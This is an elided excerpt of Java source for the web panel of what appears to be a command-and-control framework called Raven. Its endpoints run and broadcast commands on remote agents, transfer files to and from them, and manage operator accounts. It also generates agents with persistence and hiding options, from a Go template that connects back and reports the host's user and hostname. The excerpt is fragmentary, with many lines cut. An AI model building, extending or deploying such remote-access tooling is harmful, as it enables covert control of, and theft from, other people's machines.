...
public final class WebApp {
    ...
    public void AttachServer(RavenServer ExistingServer, Instant StartTime) {
        ...
        Logger.Info("WebApp attached to existing RavenServer on " + ExistingServer.GetHost() + ":"
                + ExistingServer.GetPort());
    }
    ...
    private String ApiStart(HttpExchange E) throws Exception {
        if (Server != null && Server.IsRunning())
            return GsonInst.toJson(Map.of("Error", "Already running"));
    ...
    private String ApiStop(HttpExchange E) {
        if (Server == null || !Server.IsRunning())
            return GsonInst.toJson(Map.of("Error", "Not running"));
        Server.StopServer();
        Server = null;
    ...
    private String ApiKill(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning())
            return GsonInst.toJson(Map.of("Error", "Server not running"));
        int Id = Num(Body(E), "AgentId", 0);
        if (Id == 0)
            return GsonInst.toJson(Map.of("Error", "AgentId required"));
    ...
    private String ApiExec(HttpExchange E) throws Exception {
        ...
        if (AgentId == 0 || Command.isEmpty())
            return GsonInst.toJson(Map.of("Error", "AgentId and Command required"));
    ...
    private String ApiBroadcast(HttpExchange E) throws Exception {
        ...
        if (Command.isEmpty())
            return GsonInst.toJson(Map.of("Error", "Command required"));
        ...
        if (Ids.isEmpty())
            return GsonInst.toJson(Map.of("Error", "AgentIds required"));
    ...
    private String ApiOpCreate(HttpExchange E) throws Exception {
        ...
        if (User.isEmpty() || Pass.isEmpty())
            return GsonInst.toJson(Map.of("Error", "Username and Password required"));
        if (Pass.length() < 8)
            return GsonInst.toJson(Map.of("Error", "Password must be at least 8 characters"));
    ...
    private String ApiOpDelete(HttpExchange E) throws Exception {
        ...
        if (User.isEmpty())
            return GsonInst.toJson(Map.of("Error", "Username required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername()))
            return GsonInst.toJson(Map.of("Error", "Cannot delete admin"));
        boolean Del = Db.DeleteOperator(User);
        if (Del)
            AddLog("[TEAM] Operator deleted: " + User);
    ...
    private String ApiOpRole(HttpExchange E) throws Exception {
        ...
        if (User.isEmpty() || Role.isEmpty())
            return GsonInst.toJson(Map.of("Error", "Username and Role required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername()))
            return GsonInst.toJson(Map.of("Error", "Cannot change admin role"));
        TeamDatabase.OperatorRole R = TeamDatabase.OperatorRole.FromString(Role);
    ...
    private String ApiOpPassword(HttpExchange E) throws Exception {
        ...
        if (Ok)
            AddLog("[TEAM] Password changed: " + User);
    ...
    private String ApiChatSend(HttpExchange E) throws Exception {
        ...
        if (Msg.isEmpty())
            return GsonInst.toJson(Map.of("Error", "Message required"));
    ...
    private String ApiDownload(HttpExchange E) throws Exception {
        ...
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0 || Path.isEmpty())
            return GsonInst.toJson(Map.of("Error", "AgentId and Path required"));
    ...
    private String ApiUpload(HttpExchange E) throws Exception {
        ...
        String Operator = Str(B, "Operator", "system");
        if (AgentId == 0 || LocalPath.isEmpty())
            return GsonInst.toJson(Map.of("Error", "AgentId and LocalPath required"));
    ...
    private String ApiOpKick(HttpExchange E) throws Exception {
        ...
        if (User.isEmpty())
            return GsonInst.toJson(Map.of("Error", "Username required"));
        if (User.equalsIgnoreCase(Config.GetAdminUsername()))
            return GsonInst.toJson(Map.of("Error", "Cannot kick admin"));
        if (Db.DeleteOperator(User))
            return GsonInst.toJson(Map.of("Success", true, "Message", "Operator kicked: " + User));
    ...
    private String ApiAgentGen(HttpExchange E) throws Exception {
        ...
        try {
            ...
            java.nio.file.Files.copy(
                    java.nio.file.Paths.get(CertPath),
                    java.nio.file.Paths.get(OutDir + "/agent.p12"),
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.nio.file.Files.copy(
                    java.nio.file.Paths.get(Config.GetCaPath()),
                    java.nio.file.Paths.get(OutDir + "/ca.p12"),
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            ...
            java.nio.file.Files.writeString(java.nio.file.Paths.get(OutDir + "/README.txt"),
                    "Agent — " + AgentId + "\n" +
                            "Server  : " + Host + ":" + Port + "\n" +
                            "MTLS    : " + Mtls + "\n" +
                            "Lang    : " + Lang + "\n" +
            ...
            return GsonInst.toJson(Map.of(
                    ...
                    "Lang", Lang,
                    "Mtls", Mtls,
                    "Files", java.util.List.of("agent.p12", "ca.p12", com.raven.utils.AgentSourceGen.Filename(Lang),
                            "README.txt")));
        } catch (Exception Ex) {
    ...
    private String ApiAgentList(HttpExchange E) throws Exception {
        ...
        if (!java.nio.file.Files.exists(Dir))
            return GsonInst.toJson(Map.of("Agents", new ArrayList<>()));
    ...
    private String GenerateAgentSource(String Lang, String Id, String Host, int Port, boolean Mtls, boolean Persist,
            boolean Hide) {
        return switch (Lang) {
    ...
    private String GoAgent(String Id, String Host, int Port, boolean Mtls) {
        ...
        return String.join(NL,
                ...
                "    h, _ := os.Hostname()",
                "    u := os.Getenv(\"USER\")",
                "    fmt.Fprintf(conn, \"{\\\"Type\\\":\\\"RAW\\\",\\\"ID\\\":\\\"" + Id
                        + "\\\",\\\"OS\\\":\\\"linux\\\",\\\"User\\\":\\\"%s\\\",\\\"Hostname\\\":\\\"%s\\\"}\\n\", u, h)",
